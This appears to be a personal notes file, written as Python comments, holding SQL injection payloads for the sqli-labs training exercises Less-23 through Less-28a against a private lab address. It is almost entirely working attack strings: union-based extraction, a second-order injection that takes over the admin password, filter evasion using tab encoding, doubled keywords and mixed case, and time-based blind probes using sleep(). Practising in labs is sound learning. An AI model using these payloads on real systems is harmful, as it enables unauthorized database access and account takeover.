#!/usr/bin/env python
#coding=utf-8

# Less-23
'''
GET-Error based stip comments

http://10.0.103.130/Less-23/?id=-2' union select 1,version(),3 and '4
'''

# Less-24
'''
POST-Second Order Injections

http://10.0.103.130/Less-24/new_user.php
Desired Username: admin'-- 
login
reset password
'''

# Less-25
'''
GET-Error based - All your OR & AND belong to us -string single quote

http://10.0.103.130/Less-25/?id=3' %26%26 1=1+--+
'''

# Less-25a
'''
 GET-Blind based - All your OR & AND belong to us - Intiger based

 http://10.0.103.130/Less-25a/?id=3 %26%26 1=1
 http://10.0.103.130/Less-25a/?id=3 %26%26 1=2
'''

# Less-26
'''
GET-Error based - All your SPACES and COMMENTS belong to us

http://10.0.103.130/Less-26/?id=4'%26%26(1=1)%26%26'1
http://10.0.103.130/Less-26/?id=4'%26%26(1=2)%26%26'1
'''

# Less-26a
'''
GET-Error based - All your SPACES and COMMENTS belong to us -string-single quotes-Parenthesis

http://10.0.103.130/Less-26a/?id=3')%26%26(1=1)%26%26('1
http://10.0.103.130/Less-26a/?id=3')%26%26(1=2)%26%26('1
'''

# Less-27
'''
GET - Error Based - All your UNION & SELECT Belong to us - String - Single quote

http://10.0.103.130/Less-27/?id=1'%09and%09%091=2%09uNion%09seLect%091,version(),3%09and%09'1
http://10.0.103.130/Less-27/?id=1'%09and%09%091=1%09uNion%09seLect%091,version(),3%09and%09'1
'''

# Less-27a
'''
GET - Error Based - All your UNION & SELECT Belong to us - String - Single quote

http://10.0.103.130/Less-27a/?id=1"%09and%091=1%09uNion%09seLect%091,version(),3%09and%09"2
http://10.0.103.130/Less-27a/?id=1"%09and%091=2%09uNion%09seLect%091,version(),3%09and%09"2
'''

# Less-28
'''
GET - Error Based - All your UNION & SELECT Belong to us - single quote with parenthesis

http://10.0.103.130/Less-28/?id=3')%09and%091=1%09uUnion%09Selectnion%09seLect%091,version(),3%09and('1
http://10.0.103.130/Less-28/?id=3')%09and%091=2%09uUnion%09Selectnion%09seLect%091,version(),3%09and('1
'''

# Less-28a
'''
GET - Blind Based - All your UNION & SELECT Belong to us - single quote-parenthesis

http://10.0.103.130/Less-28a/?id=2')%09and%09if(1=1,sleep(2),0)and('1
http://10.0.103.130/Less-28a/?id=2')%09and%09if(1=2,sleep(2),0)and('1
'''
